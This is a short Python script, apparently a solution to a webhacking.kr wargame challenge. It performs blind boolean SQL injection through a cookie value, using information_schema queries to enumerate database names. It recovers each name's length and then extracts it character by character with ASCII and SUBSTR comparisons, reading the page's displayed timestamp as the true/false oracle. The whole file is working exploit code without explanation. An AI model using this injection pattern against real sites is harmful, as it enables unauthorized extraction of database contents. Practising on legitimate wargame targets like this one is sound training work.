import requests

url = "https://webhacking.kr/challenge/web-02/"

for count in range(0, 2):
    cookies = {'PHPSESSID': 'r9qrd0teu3uhiaubfl9qfbuid7',
           'time':
               '(1<2) & ((SELECT LENGTH(schema_name) FROM information_schema.schemata LIMIT {0}, 1) <> 18)'.format(count)}

    req = requests.get(url=url, cookies=cookies)
    req = req.text
    if req.count("2070-01-01 09:00:00") != 0:
    
        continue
    else:
        db_name = ""
        length = 0
        
        while True:
            cookies['time'] = '(1<2) & ((SELECT LENGTH(schema_name) FROM information_schema.schemata LIMIT {0}, 1) = {1})'.format(count, length)
            req = requests.get(url=url, cookies=cookies)
            req = req.text
            if req.count("2070-01-01 09:00:01") != 0:
                break
            length += 1
            
        for j in range(1, length+1):
            char = 33
            while True:
                cookies['time'] = '(1<2) & (ASCII(SUBSTR((SELECT schema_name FROM information_schema.schemata LIMIT {0}, 1), {1}, 1)) = {2})'.format(count, j, char)
                req = requests.get(url=url, cookies=cookies)
                req = req.text
                if req.count("2070-01-01 09:00:01") != 0:
                    break
                char += 1
            db_name += chr(char)
        print(db_name)
        
